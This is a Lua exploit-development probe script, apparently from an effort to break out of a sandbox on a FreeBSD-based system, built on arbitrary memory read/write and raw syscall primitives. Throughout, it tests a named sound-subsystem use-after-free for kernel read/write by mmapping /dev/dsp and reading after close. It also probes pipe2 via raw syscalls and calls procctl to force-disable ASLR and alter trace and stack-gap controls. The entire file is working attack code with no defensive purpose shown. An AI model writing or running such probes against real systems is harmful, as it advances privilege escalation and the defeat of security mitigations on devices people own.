-- CRASH_CLASS: MODERATE
-- PROBE 79a: Test /dev/dsp access, pipe2 via make_syscall, and procctl(544)
--
-- Context: Three separate untested vectors in one probe:
--   A) /dev/dsp — CVE-2026-49417 (FreeBSD-SA-26:38.sound) is a UAF in the
--      sound subsystem where mmap on /dev/dsp creates a buffer that gets freed
--      on device close while the mapping stays valid. Direct kernel R/W if open works.
--   B) pipe2(542) — pipe(42) via make_syscall is dead (fds 0,0). pipe2 has a
--      different kernel path. Never tested via make_syscall.
--   C) procctl(544) — PROC_ASLR_CTL could disable ASLR. NEVER tested.
--      Also test PROC_REAP_STATUS, PROC_TRACE_CTL, PROC_STACKGAP_CTL.

print("=== PROBE 79a: DEV/DSP + PIPE2 + PROCCTL ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

local sc_getpid = make_syscall(20)
local sc_open = make_syscall(5)
local sc_close = make_syscall(6)
local sc_pipe2 = make_syscall(542)
local sc_procctl = make_syscall(544)
local sc_read = make_syscall(3)
local sc_write = make_syscall(4)
local sc_mmap = make_syscall(477)

local function canary()
    local ok, pid = pcall(function() return sc_getpid():tonumber() end)
    return ok, pid
end

local alive_ok, pid = canary()
print("[0] canary pid=" .. tostring(pid) .. " ok=" .. tostring(alive_ok))

-- ==============================
-- SECTION A: /dev/dsp access (CVE-2026-49417 prereq)
-- ==============================
print("")
print("=== SECTION A: /dev/dsp ACCESS TEST ===")

-- Build path strings
local dev_paths = {
    "/dev/dsp",
    "/dev/dsp0",
    "/dev/dsp0.0",
    "/dev/audio",
    "/dev/mixer",
    "/dev/sndstat",
}

for _, path in ipairs(dev_paths) do
    local pbuf = memory.alloc(64)
    zero(pbuf, 64)
    for i = 1, #path do
        pcall(function() memory.write_byte(pbuf + i - 1, string.byte(path, i)) end)
    end
    pcall(function() memory.write_byte(pbuf + #path, 0) end)

    -- O_RDWR=2, O_RDONLY=0
    local ok_rw, fd_rw = pcall(function() return sc_open(uint64(pbuf), uint64(2), uint64(0)) end)
    local fd_rw_num = to_num(fd_rw)

    local ok_ro, fd_ro = pcall(function() return sc_open(uint64(pbuf), uint64(0), uint64(0)) end)
    local fd_ro_num = to_num(fd_ro)

    print(string.format("[A] %s: O_RDWR ok=%s fd=%d | O_RDONLY ok=%s fd=%d",
        path, tostring(ok_rw), fd_rw_num, tostring(ok_ro), fd_ro_num))

    -- If we got a valid fd, try to mmap it
    if fd_rw_num > 0 then
        local mok, maddr = pcall(function()
            return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
                uint64(1), uint64(fd_rw_num), uint64(0))
        end)
        print(string.format("[A] %s mmap ok=%s addr=%s", path, tostring(mok), q(maddr)))

        -- Close and check if mmap survives (the CVE!)
        pcall(function() sc_close(uint64(fd_rw_num)) end)
        print(string.format("[A] %s closed fd=%d — mmap region should still be mapped", path, fd_rw_num))

        if mok and maddr then
            local rval = rq(maddr)
            print(string.format("[A] %s post-close read: %s", path, q(rval)))
        end
    else
        if fd_rw_num > 0 then pcall(function() sc_close(uint64(fd_rw_num)) end) end
    end

    if fd_ro_num > 0 then pcall(function() sc_close(uint64(fd_ro_num)) end) end
end

local c1_ok, c1_pid = canary()
print("[A] canary ok=" .. tostring(c1_ok) .. " pid=" .. tostring(c1_pid))

-- ==============================
-- SECTION B: pipe2(542) via make_syscall
-- ==============================
print("")
print("=== SECTION B: pipe2(542) VIA MAKE_SYSCALL ===")

-- pipe2(int fildes[2], int flags)
-- Try multiple argument layouts
local fdbuf = memory.alloc(16)

-- Layout 1: (pointer_to_fd_array, flags=0)
zero(fdbuf, 16)
wq(fdbuf, uint64(string.format("0x%X%08X", 0xDEADDEAD, 0xDEADDEAD)))
local ok1, rv1 = pcall(function() return sc_pipe2(uint64(fdbuf), uint64(0)) end)
local fd0 = rd(fdbuf)
local fd1 = rd(fdbuf + 4)
print(string.format("[B] layout1 (buf, 0): ok=%s rv=%s fd0=%s fd1=%s",
    tostring(ok1), tostring(rv1), tostring(fd0), tostring(fd1)))

-- Layout 2: (pointer_to_fd_array, O_CLOEXEC=0x00100000)
zero(fdbuf, 16)
wq(fdbuf, uint64(string.format("0x%X%08X", 0xDEADDEAD, 0xDEADDEAD)))
local ok2, rv2 = pcall(function() return sc_pipe2(uint64(fdbuf), uint64(0x00100000)) end)
fd0 = rd(fdbuf)
fd1 = rd(fdbuf + 4)
print(string.format("[B] layout2 (buf, O_CLOEXEC): ok=%s rv=%s fd0=%s fd1=%s",
    tostring(ok2), tostring(rv2), tostring(fd0), tostring(fd1)))

-- Layout 3: (pointer_to_fd_array, O_NONBLOCK=0x4)
zero(fdbuf, 16)
wq(fdbuf, uint64(string.format("0x%X%08X", 0xDEADDEAD, 0xDEADDEAD)))
local ok3, rv3 = pcall(function() return sc_pipe2(uint64(fdbuf), uint64(4)) end)
fd0 = rd(fdbuf)
fd1 = rd(fdbuf + 4)
print(string.format("[B] layout3 (buf, O_NONBLOCK): ok=%s rv=%s fd0=%s fd1=%s",
    tostring(ok3), tostring(rv3), tostring(fd0), tostring(fd1)))

-- If any pipe2 returned valid fds, test them
if fd0 and fd0 > 0 and fd1 and fd1 > 0 then
    print("[B] PIPE2 SUCCESS! fd0=" .. fd0 .. " fd1=" .. fd1)
    -- Write to fd1, read from fd0
    local wbuf = memory.alloc(16)
    wd(wbuf, 0xCAFEBABE)
    local wok, wrv = pcall(function() return sc_write(uint64(fd1), uint64(wbuf), uint64(4)) end)
    print("[B] write ok=" .. tostring(wok) .. " rv=" .. tostring(wrv))

    local rbuf = memory.alloc(16)
    zero(rbuf, 16)
    local rok, rrv = pcall(function() return sc_read(uint64(fd0), uint64(rbuf), uint64(4)) end)
    local rval = rd(rbuf)
    print("[B] read ok=" .. tostring(rok) .. " rv=" .. tostring(rrv) .. " val=0x" .. string.format("%X", rval or 0))

    pcall(function() sc_close(uint64(fd0)) end)
    pcall(function() sc_close(uint64(fd1)) end)
end

local c2_ok, c2_pid = canary()
print("[B] canary ok=" .. tostring(c2_ok) .. " pid=" .. tostring(c2_pid))

-- ==============================
-- SECTION C: procctl(544)
-- ==============================
print("")
print("=== SECTION C: procctl(544) ===")

-- procctl(idtype_t idtype, id_t id, int cmd, void *data)
-- idtype: P_PID=0
-- cmd values from FreeBSD:
--   PROC_ASLR_CTL = 13
--   PROC_ASLR_STATUS = 14
--   PROC_REAP_ACQUIRE = 2
--   PROC_REAP_RELEASE = 3
--   PROC_REAP_STATUS = 4
--   PROC_TRACE_CTL = 7
--   PROC_TRACE_STATUS = 8
--   PROC_STACKGAP_CTL = 17
--   PROC_STACKGAP_STATUS = 18
--   PROC_NO_NEW_PRIVS_CTL = 19
--   PROC_NO_NEW_PRIVS_STATUS = 20

local databuf = memory.alloc(0x100)

local procctl_cmds = {
    {name="PROC_REAP_ACQUIRE", cmd=2},
    {name="PROC_REAP_STATUS", cmd=4},
    {name="PROC_TRACE_CTL", cmd=7},
    {name="PROC_TRACE_STATUS", cmd=8},
    {name="PROC_ASLR_CTL(disable)", cmd=13, val=2},   -- PROC_ASLR_FORCE_DISABLE=2
    {name="PROC_ASLR_CTL(enable)", cmd=13, val=1},    -- PROC_ASLR_FORCE_ENABLE=1
    {name="PROC_ASLR_STATUS", cmd=14},
    {name="PROC_STACKGAP_CTL", cmd=17},
    {name="PROC_STACKGAP_STATUS", cmd=18},
    {name="PROC_NO_NEW_PRIVS_CTL", cmd=19},
    {name="PROC_NO_NEW_PRIVS_STATUS", cmd=20},
}

for _, entry in ipairs(procctl_cmds) do
    zero(databuf, 0x100)
    if entry.val then
        wd(databuf, entry.val)
    end

    -- P_PID=0, id=our_pid
    local ok, rv = pcall(function()
        return sc_procctl(uint64(0), uint64(pid), uint64(entry.cmd), uint64(databuf))
    end)
    local rv_num = to_num(rv)
    local d0 = rd(databuf)
    local d1 = rd(databuf + 4)
    local d2 = rd(databuf + 8)
    local d3 = rd(databuf + 12)

    print(string.format("[C] %s (cmd=%d): ok=%s rv=%d buf=[%s %s %s %s]",
        entry.name, entry.cmd, tostring(ok), rv_num,
        string.format("0x%08X", d0 or 0),
        string.format("0x%08X", d1 or 0),
        string.format("0x%08X", d2 or 0),
        string.format("0x%08X", d3 or 0)))

    -- If ASLR_CTL returned 0, check if ASLR is actually disabled
    if entry.name == "PROC_ASLR_CTL(disable)" and rv_num == 0 then
        print("[C] *** PROC_ASLR_CTL DISABLE RETURNED SUCCESS! ***")
        -- Verify by checking module bases across connections
        -- (requires external tool, but flag it)
    end

    if entry.name == "PROC_ASLR_STATUS" and rv_num == 0 then
        print("[C] ASLR status: " .. string.format("0x%08X", d0 or 0))
    end
end

-- Also try P_PGID=2, P_SID=3, P_JAILID=5
print("")
print("[C] Testing non-PID id types:")
for _, idtype in ipairs({2, 3, 5}) do
    zero(databuf, 0x100)
    local ok, rv = pcall(function()
        return sc_procctl(uint64(idtype), uint64(0), uint64(14), uint64(databuf))
    end)
    print(string.format("[C] idtype=%d ASLR_STATUS: ok=%s rv=%s buf0=0x%08X",
        idtype, tostring(ok), tostring(rv), rd(databuf) or 0))
end

local c3_ok, c3_pid = canary()
print("[C] canary ok=" .. tostring(c3_ok) .. " pid=" .. tostring(c3_pid))

print("")
print("=== PROBE 79a COMPLETE ===")
